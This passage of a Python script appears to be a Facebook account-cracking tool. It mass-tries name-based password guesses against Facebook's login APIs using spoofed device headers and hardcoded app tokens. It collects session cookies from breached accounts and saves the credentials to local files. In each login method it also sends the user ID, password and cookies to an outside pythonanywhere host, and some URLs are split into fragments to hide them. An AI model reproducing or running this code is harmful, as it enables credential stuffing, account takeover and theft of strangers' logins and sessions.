    uaD28 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}zar0{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            pas = rmpassconf(ids,pas)
            data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head ={
                'User-Agent':get_random_user_agent(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}zar0-OK{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(uid)
                    open('/sdcard/zar0-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {ckkk}")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{ckkk}")
                    break
            elif "www.facebook.com" in q:
                cps.append(ids)
                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/zar0-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
        loop+=1
    except requests.exceptions.ConnectionSTM:
        time.sleep(10)
    except Exception as e:
        pass

#====================[RANDOM M3]==========================
def randm2(ids,psd,tl):
    global loop,oks,cps
    sm_mdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}zar0{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accessToken="6628568379|c1e620fa708a1d5696fb991c1bde5662"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            pas = rmpassconf(ids,pas)
            data = {
    "adid": adid,
    "format": "json",
    "device_id": device_id,
    "cpl": "true",
    "family_device_id": family_device_id,
    "credentials_type": "device_based_login_password",
    "error_detail_type": "button_with_disabled",
    "source": "device_based_login",
    "email": ids,
    "password": pas,
    "access_token": accessToken,
    "generate_session_cookies": "1",
    "meta_inf_fbmeta": "",
    "advertiser_id": advertiser_id,
    "currently_logged_in_userid": "0",
    "locale": "en_US",
    "client_country_code": "US",
    "method": "auth.login",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
    "api_key": "882a8490361da98702bf97a021ddc14d"
}
            head ={
    "User-Agent": uaD2,
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "graph.facebook.com",
    "X-FB-Net-HNI": netheni,
    "X-FB-SIM-HNI": simheni,
    "X-FB-Connection-Type": "MOBILE.LTE",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}zar0-OK{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(uid)
                    open('/sdcard/zar0-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {ckkk}")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{ckkk}")
                    break
            elif "www.facebook.com" in q:
                cps.append(ids)
                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/zar0-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
        loop+=1
    except requests.exceptions.ConnectionSTM:
        time.sleep(10)
    except Exception as e:
        pass
#====================[RANDOM M4]==========================
def randm3(ids,psd,tl):
    global loop,oks,cps
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r{red}[{white}✓{red}] {red}[{abir}zar0{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    sm2 =('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
    ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(samsung))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
    session=requests.Session()
    try:
        for pas in psd:
            free_fb = session.get('https://m.facebook.com').text
            pas = rmpassconf(ids,pas)
            info={
            'jazoest':  re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd':  re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'display': '',
            'isprivate': '',
            'return_session': '',
            'skip_api_login': '',
            'signed_next': '',
            'trynum': '1',
            'timezone': '-330',
            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
            'lgnrnd': '060644_83c4',
            'lgnjs': '1730207205',
            'email': ids,
            'prefill_contact_point': ids,
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'password',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': 'true',
            'had_password_prefilled': 'true',
            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAH/AHAHHAAABFAM',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),}
            update={
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.facebook.com',
            'DNT': '1',
            'Alt-Used': 'www.facebook.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',}
            session.post(url=f"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                ckkk = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', ckkk)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}zar0-OK{red}] {green}{uid} {white}| {green}{pas} ")
                    print(f"\r\r{red}[{white}✓{red}] {red}[{green}COOKIE{red}]{green} ={white} {ckkk}")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pas}|{ckkk}")
                    oks.append(uid)
                    open('/sdcard/zer0-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
            if 'checkpoint' in log_cookies:
                #print(f"\r\r{red}[{white}✓{red}] {red}DIE {uid} | {pas} ")
                open('/sdcard/zer0-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionSTM:
        time.sleep(10)
    except Exception as e:
        pass


def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/zar0.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f'{rad}[{white}🔖{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
    except:
        pass_lmit = 3
    for i in range(pass_lmit):
        dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡ {i+1} {white}▶︎ {yelloww}'));linex()
    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}");os.system('clear')
    with ThreadPool(max_workers=60) as zar0:
        ____banner____();total_ids = str(len(dx))
        print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad} ! {green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
        print(f'{rad}[{white}🔖{green}] TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' )
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a","1","01"]:
                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b","2","02"]:
                zar0.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c","3","03"]:
                zar0.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d","4","04"]:
                zar0.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e","5","05"]:
                zar0.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f","6","06"]:
                zar0.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
    linex();exit()

def __MTDONEE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            cban = str(random.randint(20000000, 30000000))
            user_agent = mls1()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{advertiser_id}",
                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                "sdk_version": str(random.randint(1,26)),
                "email": ids,
                "password": pas,
                "sdk": "android",
                "locale": random.choice(["en_US","en_GB","bn_IN","in_ID"]),
                "generate_session_cookies": "1",
                "sig": "c1e620fa708a1d5696fb991c1bde5662",}
            headers = [
                "Host: graph.facebook.com",
                f"x-fb-connection-bandwidth: {cban}",
                f"x-fb-sim-hni: {netheni}",
                f"x-fb-net-hni: {simheni}",
                "x-fb-connection-quality: EXCELLENT",
                "content-type: application/x-www-form-urlencoded",
                "x-fb-http-engine: Liger",
                f"User-Agent: {user_agent.encode('utf-8')}",
            ]
            url = "https://a"+"pi.face"+"book.c"+"om/a"+"uth/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                #print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
                oks.append(ids)
                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTWOO__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls2()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                #print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={ids}|{pas}|{cookie}")
                oks.append(ids)
                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0","\x1b[1;97mzar0","\x1b[1;91mzar0","\x1b[1;92mzar0","\x1b[1;93mzar0","\x1b[1;94mzar0","\x1b[1;95mzar0","\x1b[1;96mzar0"])
    sys.stdout.write(f"\r{rad}[{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = mls3()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
